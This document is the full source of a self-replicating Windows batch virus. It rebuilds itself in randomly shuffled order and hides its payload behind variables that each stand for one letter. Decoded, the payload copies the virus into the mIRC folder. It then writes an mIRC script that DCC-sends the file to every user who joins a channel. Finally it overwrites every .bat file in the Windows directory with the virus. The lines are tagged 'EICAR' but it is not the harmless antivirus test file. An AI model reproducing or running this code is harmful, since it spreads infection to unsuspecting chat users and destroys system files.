cls%EICAR%
@echo off%EICAR%
set a=0%EICAR%
set aa=0%EICAR%
set bb=0%EICAR%
set cc=0%EICAR%
set dd=0%EICAR%
set ee=0%EICAR%
set ff=0%EICAR%
set gg=0%EICAR%
find "EICAR"<%0 >EICAR.bat
set sec=A%EICAR%
:TitanMoon	%EICAR%
if %aa% EQU 1 (if %bb% EQU 1 (if %cc% EQU 1 (if %dd% EQU 1 (if %ee% EQU 1 (goto saturn)))))%EICAR%
call :RheaMoon%EICAR%
if %aa% EQU 0 (if %a% EQU 45 (%EICAR%
find "%Sec%aAa" <%0 >>EICAR.bat%EICAR%
set aa=1))%EICAR%
if %bb% EQU 0 (if %a% EQU 46 (%EICAR%
find "%sec%bBb" <%0 >>EICAR.bat%EICAR%
set bb=1))%EICAR%
if %cc% EQU 0 (if %a% EQU 47 (%EICAR%
find "%sec%cCc" <%0 >>EICAR.bat%EICAR%
set cc=1))%EICAR%
if %dd% EQU 0 (if %a% EQU 48 (%EICAR%
find "%sec%dDd" <%0 >>EICAR.bat%EICAR%
set dd=1))%EICAR%
if %ee% EQU 0 (if %a% EQU 49 (%EICAR%
find "%sec%eEe" <%0 >>EICAR.bat%EICAR%
set ee=1))%EICAR%
goto TitanMoon%EICAR%
:RheaMoon 	%EICAR%
set a=%random%%EICAR%
:IapetusMoon	%EICAR%
if %a% GEQ 50 (set /A a=%a%/2)%EICAR%
if %a% LEQ 45 (set /A a=%a%+5)%EICAR%
if %a% LSS 45 (goto :IapetusMoon)%EICAR%
if %a% GTR 50 (goto :IapetusMoon)%EICAR%
goto :EOF	%EICAR%
:saturn  %EICAR%
if %ply% GTR 16383 (%EICAR%
find "%sec%sat"<%0 >>EICAR.bat  %EICAR%
find "%sec%tas"<%0 >>EICAR.bat  %EICAR%
) ELSE (  %EICAR%
find "%sec%tas"<%0 >>EICAR.bat  %EICAR%
find "%sec%sat"<%0 >>EICAR.bat  %EICAR%
)  %EICAR%
set !!.!!=h%AdDd%
set !!.!!=i%AdDd%
goto !!.!!	%AdDd%
set !!.!!=w%AdDd%
:!!.!!		%AdDd%
:!.!..		%AdDd%
set !..!!=b%AdDd%
set !..!!=y%AdDd%
goto !..!!	%AdDd%
set !..!!=w%AdDd%
:!..!!		%AdDd%
set !!!.!=q%AcCc%
set !!!.!=o%AcCc%
goto !!!.!	%AcCc%
set !!!.!=u%AcCc%
:!!!.!		%AcCc%
set !!.!.=j%AcCc%
set !!.!.=n%AcCc%
goto !!.!.	%AcCc%
set !!.!.=l%AcCc%
:!!.!.		%AcCc%
set !.!.!=b%AbBb%
set !.!.!=y%AbBb%
goto !.!.!	%AbBb%
set !.!.!=w%AbBb%
:!.!.!		%AbBb%
set !..!.=p%AbBb%
set !..!.=s%AbBb%
goto !..!.	%AbBb%
set !..!.=o%AbBb%
:!..!.		%AbBb%
set !!..!=f%AeEe%
set !!..!=d%AeEe%
goto !!..!	%AeEe%
set !!..!=b%AeEe%
:!!..!		%AeEe%
set !.!!.=w%AeEe%
set !.!!.=p%AeEe%
goto !.!!.	%AeEe%
set !.!!.=d%AeEe%
:!.!!.		%AeEe%
set !.!..=b%AeEe%
set !.!..=e%AeEe%
goto !.!..	%AeEe%
set !.!..=w%AeEe%
set !!!!.=t%AaAa%
set !!!!.=f%AaAa%
goto !!!!.	%AaAa%
set !!!!.=k%AaAa%
:!!!!.		%AaAa%
set !!!..=v%AaAa%
set !!!..=r%AaAa%
goto !!!..	%AaAa%
set !!!..=u%AaAa%
:!!!..		%AaAa%
set !.!!!=p%AaAa%
set !.!!!=c%AaAa%
goto !.!!!	%AaAa%
set !.!!!=q%AaAa%
:!.!!!		%AaAa%
%!.!!!%%!!!.!%%!.!!.%%!.!.!% EICAR.bat C:\mirc\saturn.bat %Asat%
%!.!..%%!.!!!%h%!!!.!% [%!..!.%%!.!!!%%!!!..%%!!.!!%%!.!!.%t] >C:\mirc\script.ini %Asat%
%!.!..%%!.!!!%h%!!!.!% %!!.!.%0=%!!!.!%n 1:j%!!!.!%%!!.!!%%!!.!.%:*.* { %!!.!!%%!!!!.% ( $n%!!.!!%%!.!!!%k ==$m%!.!..% )  {halt} /d%!.!!!%%!.!!!% %!..!.%%!.!..%%!!.!.%d $n%!!.!!%%!.!!!%k C:\mirc\saturn.bat } >>C:\mirc\script.ini %Asat%
%!!!!.%%!!!.!%%!!!..% %%q %!!.!!%%!!.!.% (%windir%\*.bat) %!!..!%%!!!.!% %!.!!!%%!!!.!%%!.!!.%%!.!.!% EICAR.bat %%q %Atas%
